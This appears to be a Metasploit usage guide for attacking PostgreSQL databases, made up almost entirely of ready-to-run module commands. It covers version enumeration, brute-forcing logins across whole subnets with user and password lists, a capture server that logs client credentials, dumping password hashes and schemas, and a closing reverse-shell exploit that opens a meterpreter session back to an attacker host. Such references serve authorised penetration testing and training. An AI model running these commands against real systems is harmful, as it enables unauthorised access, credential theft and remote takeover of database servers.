## PostgreSQL

For instance, when running a PostgreSQL instance:

```
docker run --rm -p 5432:5432 -e POSTGRES_PASSWORD=password postgres:13.1-alpine
```

### PostgreSQL Enumeration

Enumerate version:

```
use auxiliary/scanner/postgres/postgres_version
run postgres://192.168.123.13
run postgres://postgres:password@192.168.123.13
```

### PostgreSQL Login / Bruteforce

If you have PostgreSQL credentials to validate:

```
use auxiliary/scanner/postgres/postgres_login
run 'postgres://root: a b c p4$$w0rd@127.0.0.1'
```

Re-using PostgreSQL credentials in a subnet:

```
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:myspostgresl://user:pass@192.168.222.0 threads=50
```

Using an alternative port:

```
use auxiliary/scanner/postgres/postgres_login
run postgres://user:pass@192.168.123.6:2222
```

Brute-force host with known user and password list:

```
use auxiliary/scanner/postgres/postgres_login
run postgres://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
```

Brute-force credentials:

```
use auxiliary/scanner/postgres/postgres_login
run postgres://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
```

Brute-force credentials in a subnet:

```
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:postgres://user:pass@192.168.222.0 threads=50
run cidr:/24:postgres://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
```

### PostgreSQL Capture Server

Captures and log PostgreSQL credentials:

```
use auxiliary/server/capture/postgresql
run
```

For example, if a client connects with:

```
psql postgres://postgres:mysecretpassword@localhost:5432
```

Metasploit's output will be:

```
msf6 auxiliary(server/capture/postgresql) >
[*] Started service listener on 0.0.0.0:5432
[*] Server started.
[+] PostgreSQL LOGIN 127.0.0.1:60406 postgres / mysecretpassword / postgres
```

### PostgreSQL Dumping

User and hash dump:

```
use auxiliary/scanner/postgres/postgres_hashdump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13/database_name
```

Schema dump:

```
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13 ignored_databases=template1,template0,postgres
```

### PostgreSQL Querying

```
use auxiliary/admin/postgres/postgres_sql
run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()'
```

### PostgreSQL Reverse Shell

```
use exploit/linux/postgres/postgres_payload
run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\ x86_64'
```
